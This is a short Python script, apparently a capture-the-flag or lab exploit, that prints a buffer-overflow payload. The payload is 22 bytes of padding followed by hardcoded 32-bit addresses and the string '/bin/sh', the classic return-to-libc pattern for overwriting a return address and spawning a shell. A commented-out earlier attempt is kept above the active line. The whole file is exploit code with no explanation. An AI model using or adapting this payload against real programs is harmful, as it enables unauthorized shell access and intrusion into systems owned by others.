import sys

b = "2222222222222222222222"
b= b.encode("utf-8")

path = "/bin/sh"
path = path.encode()
#sys.stdout.buffer.write(b + b"\x20\x08\x07\x08" + b"\x32"*4 + b"\x38\xfc\xf6\xff" + b"\x30\xfc\xf6\xff" +b"\x00"*4 + b"\x38\xfc\xf6\xff"  +b"\x00"*4 + path )
sys.stdout.buffer.write(b + b"\xf0\xfe\x04\x08" + b"\x32"*4 + b"\x28\xfc\xf6\xff" + path)